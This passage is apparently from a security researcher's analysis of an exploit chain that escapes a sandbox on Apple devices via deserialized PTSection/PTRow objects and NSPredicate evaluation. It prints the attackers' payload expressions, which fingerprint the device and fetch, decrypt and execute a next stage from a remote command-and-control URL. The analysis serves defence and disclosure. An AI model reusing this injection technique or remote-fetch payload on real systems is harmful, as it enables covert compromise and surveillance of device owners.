 <p class="YDzVciBUld-c4"><span>The first element is an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object and the second is a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;containing a single </span><span class="YDzVciBUld-c0">PTRow</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. Why?</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;are both defined in the </span><span class="YDzVciBUld-c0">PrototypeTools</span><span>&nbsp;private framework. </span><span class="YDzVciBUld-c0">PrototypeTools</span><span>&nbsp;isn&#39;t loaded in the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;target process. Let&#39;s look at what happens when an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is deserialized:</span></p><h2 class="YDzVciBUld-c7" id="h.ihjz2r1jcklz"><span>Finding a voice</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;is implemented in </span><span class="YDzVciBUld-c0">AVFAudio.framework</span><span>, which </span><span class="YDzVciBUld-c14">is</span><span>&nbsp;loaded in </span><span class="YDzVciBUld-c0">CommCenter</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ sudo vmmap `pgrep CommCenter` | grep AVFAudio</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">__TEXT &nbsp;7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Assuming that this was the first time that an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object was created inside CommCenter (which is quite likely) the Objective-C runtime will call the </span><span class="YDzVciBUld-c0">initialize</span><span>&nbsp;method on the </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;class </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc">before instantiating the first instance</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[AVSpeechSynthesisVoice initialize]</span><span>&nbsp;has a </span><span class="YDzVciBUld-c0">dispatch_once</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;block with the following code:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSBundle* bundle;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">bundle = [NSBundle bundleWithPath:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;@&quot;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;AXSpeechImplementation.bundle&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">if (![bundle isLoaded]) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; NSError err;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [bundle loadAndReturnError:&amp;err]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">}</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>So sending a serialized </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object will cause </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;to load the </span><span class="YDzVciBUld-c0">/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle</span><span>&nbsp;library. With some scripting using otool -L to list dependencies we can &nbsp;find the following dependency chain from </span><span class="YDzVciBUld-c0">AXSpeechImplementation.bundle</span><span>&nbsp;to </span><span class="YDzVciBUld-c0">PrototypeTools.framework</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[&#39;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AccessibilityUtilities.framework/AccessibilityUtilities&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AccessibilitySharedSupport.framework/AccessibilitySharedSupport&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; PrototypeTools.framework/PrototypeTools&#39;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This explains how the deserialization of a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;will succeed. But what&#39;s so special about </span><span class="YDzVciBUld-c0">PTSections</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRows</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">?</span></p><h2 class="YDzVciBUld-c7" id="h.tsdrbvcjutdl"><span>Predicated Sections</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[PTRow initwithcoder:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;contains the following snippet:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; self-&gt;condition = [coder decodeObjectOfClass:NSPredicate</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;forKey:@&quot;condition&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [self-&gt;condition allowEvaluation]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This will deserialize an </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object, assign it to the </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;member variable </span><span class="YDzVciBUld-c0">condition</span><span>&nbsp;and call </span><span class="YDzVciBUld-c0">allowEvaluation</span><span>. This is meant to indicate that the deserializing code considers this predicate safe, but there&#39;s no attempt to perform any validation on the predicate contents here. They then need one more trick to find a path to which will additionally evaluate the </span><span class="YDzVciBUld-c0">PTRow</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&#39;s condition predicate.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Here&#39;s a snippet from </span><span class="YDzVciBUld-c0">[PTSection initWithCoder:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSSet* allowed = [NSSet setWithObjects: @[PTRow]]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">id* rows = [coder </span><span class="YDzVciBUld-c0">decodeObjectOfClasses</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">:allowed forKey:@&quot;rows&quot;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[self initWithRows:rows]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This deserializes an array of </span><span class="YDzVciBUld-c0">PTRows</span><span>&nbsp;and passes them to </span><span class="YDzVciBUld-c0">[PTSection initWithRows]</span><span>&nbsp;which assigns a copy of the array of </span><span class="YDzVciBUld-c0">PTRows</span><span>&nbsp;to</span><span class="YDzVciBUld-c0">&nbsp;PTSection-&gt;rows</span><span>&nbsp;then calls </span><span class="YDzVciBUld-c0">[self </span><span class="YDzVciBUld-c0">_reloadEnabledRows</span><span class="YDzVciBUld-c0">]</span><span>&nbsp;which in turn passes each row to </span><span class="YDzVciBUld-c2 YDzVciBUld-c0">[self _shouldEnableRow:]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">_shouldEnableRow:row {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; if (row-&gt;condition) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; return [row-&gt;condition evaluateWithObject: self-&gt;settings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; }</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">}</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>And thus, by sending a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;containing a single </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;with an attached condition </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;they can cause the evaluation of an arbitrary </span><span class="YDzVciBUld-c0">NSPredicate</span><span>, effectively equivalent to arbitrary code execution in the context of </span><span class="YDzVciBUld-c0">CommCenter</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p><h2 class="YDzVciBUld-c7" id="h.9aaj7tmx81zt"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Payload 2</span></h2>
 <p class="YDzVciBUld-c4"><span>The </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;attached to the </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;uses a similar trick to the first payload to cause the evaluation of six independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>, but this time in the context of the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;process. </span><span>They&#39;re presented here in pseudo Objective-C:</span></p><h3 class="YDzVciBUld-c8" id="h.4c2mqlgknm1m"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 1</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ &nbsp;[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;setObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;@[[NSURLComponents</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;componentsWithString:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;@&quot;https://cloudfront.net/XXX/XXX/XXX?aaaa&quot;], &#39;0&#39;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;forKey: @&quot;0&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The use of </span><span class="YDzVciBUld-c0">[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span>&nbsp;is a trick to enable the array of independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;to have &quot;local variables&quot;. In this first case they create an </span><span class="YDzVciBUld-c0 YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsurlcomponents">NSURLComponents</a></span><span>&nbsp;object which is used to build parameterised URLs. This URL builder is then stored in the global dictionary returned by </span><span class="YDzVciBUld-c0">[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span>&nbsp;under the key &quot;</span><span class="YDzVciBUld-c0">0</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p><h3 class="YDzVciBUld-c8" id="h.f96qjcb9lnky"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 2</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[NSBundle</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; bundleWithPath:@&quot;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;SlideshowKit.framework/Frameworks/OpusFoundation.framework&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;] load]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This causes the </span><span class="YDzVciBUld-c0">OpusFoundation</span><span>&nbsp;library to be loaded. The exact reason for this is unclear, though the dependency graph of </span><span class="YDzVciBUld-c0">OpusFoundation</span><span>&nbsp;does include </span><span class="YDzVciBUld-c0">AuthKit</span><span>&nbsp;which is used by the next </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>. It&#39;s possible that this payload is generic and might also be expected to work when evaluated in processes where </span><span class="YDzVciBUld-c0">AuthKit</span><span>&nbsp;isn&#39;t loaded.</span></p><h3 class="YDzVciBUld-c8" id="h.o9lhtiv01xpk"><span class="YDzVciBUld-c3 YDzVciBUld-c10">Expression 3</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey:@&quot;0&quot; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; setQueryItems:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [ [ [NSArray arrayWithObject: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;m&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[AKDevice _hardwareModel] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] arrayByAddingObject: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;v&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[AKDevice _buildNumber] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] arrayByAddingObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;u&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[NSString randomString]]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This grabs a reference to the </span><span class="YDzVciBUld-c0">NSURLComponents</span><span>&nbsp;object stored under the &quot;</span><span class="YDzVciBUld-c0">0</span><span>&quot; key in the global </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;dictionary then parameterizes the HTTP query string with three values:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[AKDevice _hardwareModel]</span><span>&nbsp;returns a string like &quot;</span><span class="YDzVciBUld-c0">iPhone12,3</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot; which determines the exact device model.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[AKDevice _buildNumber]</span><span>&nbsp;returns a string like &quot;</span><span class="YDzVciBUld-c0">18A8395</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot; which in combination with the device model allows determining the exact firmware image running on the device.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[NSString randomString]</span><span>&nbsp;returns a decimal string representation of a 32-bit random integer like &quot;</span><span class="YDzVciBUld-c0">394681493</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p><h3 class="YDzVciBUld-c8" id="h.ifxeb8zet13e"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 4</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [CaliCalendarAnonymizer sharedAnonymizedString]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; setObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [NSPropertyListSerialization</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; propertyListWithData:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; [[[NSData</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dataWithContentsOfURL:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;objectForKey:@&quot;0&quot;] URL]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ] AES128DecryptWithPassword:NSData(XXXX)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] &nbsp;decompressedDataUsingAlgorithm:3 error:]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;options: Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; format: Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; errors:Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; forKey:@&quot;1&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The innermost reference to </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span>&nbsp;here grabs the </span><span class="YDzVciBUld-c0">NSURLComponents</span><span>&nbsp;object and builds the full url from the query string parameters set last earlier. That url is passed to </span><span class="YDzVciBUld-c0">[NSData dataWithContentsOfURL:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;to fetch a data blob from a remote server.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>That data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is stored in the </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span>&nbsp;dictionary under the key </span><span class="YDzVciBUld-c0">&quot;1&quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p><h3 class="YDzVciBUld-c8" id="h.rmw3ubtmn06v"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 5</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [[NSThread mainThread] threadDictionary]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; addEntriesFromDictionary:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey:@&quot;1&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">This copies all the keys and values from the &quot;next-stage&quot; plist into the main thread&#39;s theadDictionary.</span></p><h3 class="YDzVciBUld-c8" id="h.qzgbnlme8c4b"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 6</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [NSExpression expressionWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; objectForKey:@&quot;1&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey: @&quot;a&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0 YDzVciBUld-c2">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; expressionValueWithObject:nil context:nil</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c4"><span>Finally, this fetches the value of the &quot;</span><span class="YDzVciBUld-c0">a</span><span>&quot; key from the next-stage plist, parses it as an </span><span class="YDzVciBUld-c0">NSExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;string and evaluates it.</span></p><h2 class="YDzVciBUld-c7" id="h.5m5pj8ghutz4"><span class="YDzVciBUld-c9 YDzVciBUld-c3">End of the line</span></h2>
 <p class="YDzVciBUld-c4"><span>At this point we lose the ability to follow the exploit. The attackers have escaped the </span><span class="YDzVciBUld-c0">IMTranscoderAgent</span><span>&nbsp;sandbox, requested a next-stage from the command and control server and executed it, all without any memory corruption or dependencies on particular versions of the operating system.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
